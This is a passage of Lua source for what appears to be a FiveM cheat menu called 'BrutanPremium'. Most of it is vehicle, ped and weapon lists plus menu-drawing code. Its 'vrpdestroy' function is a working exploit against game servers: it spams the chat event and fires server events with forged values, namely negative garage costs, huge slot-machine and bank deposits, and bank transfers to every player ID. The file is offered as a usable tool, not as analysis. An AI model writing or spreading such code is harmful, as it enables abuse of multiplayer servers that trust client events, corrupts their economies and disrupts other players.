    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end


function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'xaxaxaxaxaxaxaxaxax',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 256 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
			
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
local menuY = { 0.1, 0.025, 0.2, 0.3, 0.425 }

local discordPresence = true



local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1

local menus = { }
local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}
local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBou328h(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

    return result
end

local allWeapons = {
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrint(text)
    if BrutanPremium.debug then
        Citizen.Trace("[Plane] "..tostring(text))
    end
end


local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
    end
end

    function BrutanPremium.SetSpriteColor(id, r, g, b, a)
        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end

local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return false
    end
end

if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end

local bv = false

local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)

local bl = {
    {
        name = "~h~Spoilers",
        id = 0
    },
    {
        name = "~h~Front Bumper",
        id = 1
    },
    {
        name = "~h~Rear Bumper",
        id = 2
    },
    {
        name = "~h~Side Skirt",
        id = 3
    },
    {
        name = "~h~Exhaust",
        id = 4
    },
    {
        name = "~h~Frame",
        id = 5
    },
    {
        name = "~h~Grille",
        id = 6
    },
    {
        name = "~h~Hood",
        id = 7
    },
    {
        name = "~h~Fender",
        id = 8
    },
    {
        name = "~h~Right Fender",
        id = 9
    },
    {
        name = "~h~Roof",
        id = 10
    },
    {
        name = "~h~Vanity Plates",
        id = 25
    },
    {
        name = "~h~Trim",
        id = 27
    },
    {
        name = "~h~Ornaments",
        id = 28
    },
    {
        name = "~h~Dashboard",
        id = 29
    },
    {
        name = "~h~Dial",
        id = 30
    },
    {
        name = "~h~Door Speaker",
        id = 31
    },
    {
        name = "~h~Seats",
        id = 32
    },
    {
        name = "~h~Steering Wheel",
        id = 33
    },
    {
        name = "~h~Shifter Leavers",
        id = 34
    },
    {
        name = "~h~Plaques",
        id = 35
    },
    {
        name = "~h~Speakers",
        id = 36
    },
    {
        name = "~h~Trunk",
        id = 37
    },
    {
        name = "~h~Hydraulics",
        id = 38
    },
    {
        name = "~h~Engine Block",
        id = 39
    },
    {
        name = "~h~Air Filter",
        id = 40
    },
    {
        name = "~h~Struts",
        id = 41
    },
    {
        name = "~h~Arch Cover",
        id = 42
    },
    {
        name = "~h~Aerials",
        id = 43
    },
    {
        name = "~h~Trim 2",
        id = 44
    },
    {
        name = "~h~Tank",
        id = 45
    },
    {
        name = "~h~Windows",
        id = 46
    },
    {
        name = "~h~Livery",
        id = 48
    },
    {
        name = "~h~Horns",
        id = 14
    },
    {
        name = "~h~Wheels",
        id = 23
    },
    {
        name = "~h~Wheel Types",
        id = "wheeltypes"
    },
    {
        name = "~h~Extras",
        id = "extra"
    },
    {
        name = "~h~Neons",
        id = "neon"
    },
    {
        name = "~h~Paint",
        id = "paint"
    },
    {
        name = "~h~Headlights Color",
        id = "headlight"
    },
    {
        name = "~h~Licence Plate",
        id = "licence"
    }
}


local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, "visible", visible)

        if not holdCurrent and menus[id] then
            setMenuProperty(id, "currentOption", 1)
        end

        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, false)
            end

            currentMenu = id
        end
    end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(true)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight / 2

        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end

        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
    end
end


local function drawSubTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

        local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }

        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

        if optionCount > menus[currentMenu].maxOptionCount then
            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
        end
    end
end


local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = nil

    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
        multiplier = optionCount
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = true
        end

        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

        if subText then
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
        end
    end
end


function BrutanPremium.CreateMenu(id, title)
    menus[id] = { }
    menus[id].title = title

    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

    menus[id].x = 0.75
    menus[id].y = 0.1
    menus[id].width = 0.225

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 13

    menus[id].titleFont = 1
    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
    menus[id].titleBackgroundSprite = nil

    menus[id].menuTextColor = { r = 0, g = 0, b = 0, a = 255 }
    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
    menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
    menus[id].menuFocusBackgroundColor = { r = 255, g = 255, b = 255, a = 180 }
    menus[id].menuBackgroundColor = { r = 5, g = 160, b = 1, a = 125 }

    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }

    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }

    debugPrint(tostring(id).." menu created")
end


function BrutanPremium.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        BrutanPremium.CreateMenu(id, menus[parent].title)

        if subTitle then
            setMenuProperty(id, "subTitle", string.upper(subTitle))
        else
            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
        end

        setMenuProperty(id, "previousMenu", parent)

        setMenuProperty(id, "x", menus[parent].x)
        setMenuProperty(id, "y", menus[parent].y)
        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
        setMenuProperty(id, "titleFont", menus[parent].titleFont)
        setMenuProperty(id, "titleColor", menus[parent].titleColor)
        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
